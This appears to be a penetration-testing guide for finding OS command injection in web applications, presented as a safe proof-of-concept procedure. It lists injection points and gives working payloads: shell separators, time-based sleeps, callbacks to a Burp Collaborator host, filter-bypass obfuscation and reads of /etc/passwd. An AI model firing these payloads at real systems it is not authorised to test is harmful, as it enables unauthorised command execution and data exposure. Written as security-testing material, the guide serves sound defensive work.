# Command Injection Testing

## Objective

Identify inputs that are passed to OS commands server-side without sanitization, allowing an attacker to execute arbitrary operating system commands in the context of the web server process.

---

## 1. Identify Injection Points

Command injection is most likely in features that invoke OS-level operations:

| Feature | Likely Injection Point |
|---|---|
| Ping / network diagnostic tool | IP address or hostname parameter |
| DNS lookup | Hostname parameter |
| File conversion (PDF, image) | Filename, format parameter |
| Log file viewer | Filename or date range |
| Backup / export | Filename, path |
| Email sending | Subject, to address |
| Username/hostname validation | Any shell-validated input |
| Report generation | Template name, data range |
| Webhook URL testing | URL parameter |

---

## 2. Detection Payloads — Safe PoC Only

> **Rule:** Use only output-confirming payloads (`id`, `whoami`, `hostname`). Never use `rm`, `wget`, reverse shells, or persistence commands.

### 2.1 Command Separators
Test each separator to see which are interpreted by the shell:

```bash
TARGET_PARAM="127.0.0.1"
ENDPOINT="https://target/tools/ping?host="

SEPARATORS=(
  ";"             # Shell statement separator
  "&"             # Background execution
  "&&"            # AND chaining
  "||"            # OR chaining
  "|"             # Pipe
  "%0a"           # URL-encoded newline
  "%0d%0a"        # CRLF
  "`"             # Backtick subshell
  "\$()"          # $() subshell
)

PAYLOAD="id"

for SEP in "${SEPARATORS[@]}"; do
  ENCODED_SEP=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$SEP'))")
  URL="${ENDPOINT}${TARGET_PARAM}${ENCODED_SEP}${PAYLOAD}"
  RESP=$(curl -si "$URL" -H "Cookie: session=USER_TOKEN" 2>/dev/null)
  echo "Separator [$SEP]: $(echo $RESP | grep -oE 'uid=[0-9]+\(.*?\)')"
  sleep 0.3
done
```

### 2.2 Direct Payload List
```
127.0.0.1;id
127.0.0.1&&id
127.0.0.1|id
127.0.0.1||id
127.0.0.1`id`
127.0.0.1$(id)
127.0.0.1%0aid
127.0.0.1%0a id
```

---

## 3. Blind Command Injection — Time-Based

When no output is returned in the response:

```bash
# Time-based detection — Linux sleep
time curl -si "https://target/tools/ping?host=127.0.0.1;sleep 3" \
  -H "Cookie: session=USER_TOKEN" | grep HTTP

# Windows equivalent
time curl -si "https://target/tools/ping?host=127.0.0.1&ping -n 3 127.0.0.1" \
  -H "Cookie: session=USER_TOKEN" | grep HTTP
```

**Confirm:** Run 3 times. Consistent 3-second delay = injection confirmed.

---

## 4. Blind Command Injection — OOB Detection

When neither output nor timing is available:

```bash
COLLAB="YOUR_COLLAB.burpcollaborator.net"

# DNS lookup (most reliable OOB)
curl -si "https://target/tools/ping?host=127.0.0.1;nslookup $COLLAB" \
  -H "Cookie: session=USER_TOKEN" | grep HTTP

# curl callback
curl -si "https://target/tools/ping?host=127.0.0.1;curl http://$COLLAB/cmdinj" \
  -H "Cookie: session=USER_TOKEN" | grep HTTP

# wget callback
curl -si "https://target/tools/ping?host=127.0.0.1;wget http://$COLLAB/cmdinj" \
  -H "Cookie: session=USER_TOKEN" | grep HTTP
```

**Confirmed** when Collaborator/interactsh receives a DNS or HTTP request.

---

## 5. Filter Bypass Techniques

If the application filters obvious separators:

### 5.1 Whitespace Bypass
```bash
# IFS (Internal Field Separator) manipulation
127.0.0.1;{id}
127.0.0.1;$IFS$9id
127.0.0.1;${IFS}id
127.0.0.1;id%09    # Tab
```

### 5.2 Encoding Bypass
```bash
# Double encoding
127.0.0.1%3Bid      # %3B = ;
127.0.0.1%7Cid      # %7C = |
127.0.0.1%26%26id   # %26%26 = &&
```

### 5.3 Command Obfuscation
```bash
# Variable substitution to bypass keyword filters
/bi$()n/id
/b'i'n/id
/bin/i\d
$(printf "\x69\x64")  # "id" via hex
```

### 5.4 Wildcard Bypass
```bash
/bin/cat /etc/p?sswd
/bin/c?t /etc/passwd
```

---

## 6. Safe PoC Commands

Once injection is confirmed, use only these safe diagnostic commands:

```bash
# Confirm execution context
id                      # uid=33(www-data) gid=33(www-data)
whoami                  # www-data
hostname                # webserver01
uname -a                # Linux kernel version
pwd                     # /var/www/html
ls /tmp                 # Writable directory check

# For Windows
whoami                  # NT AUTHORITY\SYSTEM or IIS AppPool\...
hostname
ver
```

**STOP** after confirming execution — do not enumerate file system, escalate privilege, or establish persistence.

---

## 7. Command Injection in JSON/XML API

```bash
# Injection via JSON body
curl -si -X POST https://target/api/tools/diagnose \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"hostname":"127.0.0.1;id"}' | grep -iE "uid=|root|www-data"

# Injection via XML
curl -si -X POST https://target/api/scan \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><target>127.0.0.1;id</target>' | grep -iE "uid="
```

---

## 8. Template-Based Injection (Code vs Command)

If the application passes input through a shell template:

```bash
# Test with backtick and $() subshell patterns
curl -si "https://target/report?name=\`id\`" | grep "uid="
curl -si "https://target/report?name=$(id)" | grep "uid="

# Distinguish from SSTI — OS commands vs template expressions
# OS: id, whoami, uname -a
# SSTI: {{7*7}}, ${7*7}
```

---

## Evidence to Capture

- The vulnerable endpoint and parameter
- The injection payload used
- Response showing `uid=33(www-data)` or `hostname` output
- Time-based evidence if applicable (timing screenshots)
- Collaborator log for OOB confirmation

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Direct output command injection | Pass/Fail | Critical |
| Blind time-based command injection | Pass/Fail | Critical |
| Blind OOB command injection | Pass/Fail | High-Critical |
| Filter bypass techniques effective | Pass/Fail | Critical |
| Command injection in JSON API | Pass/Fail | Critical |
